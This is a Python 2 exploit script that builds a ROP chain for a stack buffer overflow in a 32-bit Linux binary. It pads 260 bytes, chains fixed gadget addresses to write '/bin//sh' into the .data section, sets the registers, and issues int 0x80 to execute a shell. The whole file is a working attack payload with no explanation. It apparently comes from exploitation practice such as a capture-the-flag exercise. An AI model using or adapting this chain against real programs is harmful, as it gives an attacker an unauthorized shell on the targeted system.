
from struct import pack
# Padding goes here
p = 'A'*260
p += pack('<I', 0x0805e946) # pop edx ; ret
p += pack('<I', 0x080d5604) # @ .data
p += pack('<I', 0x08051644) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080541d2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805e946) # pop edx ; ret
p += pack('<I', 0x080d5608) # @ .data + 4
p += pack('<I', 0x08051644) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080541d2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0805e946) # pop edx ; ret
p += pack('<I', 0x080d560c) # @ .data + 8
p += pack('<I', 0x08048e53) # xor eax, eax ; ret
p += pack('<I', 0x080541d2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08048139) # pop ebx ; ret
p += pack('<I', 0x080d5604) # @ .data
p += pack('<I', 0x080784b0) # pop ecx ; ret
p += pack('<I', 0x080d560c) # @ .data + 8
p += pack('<I', 0x0805e946) # pop edx ; ret
p += pack('<I', 0x080d560c) # @ .data + 8
p += pack('<I', 0x08048e53) # xor eax, eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x08068c61) # inc eax ; ret
p += pack('<I', 0x080481e4) # int 0x80
print p 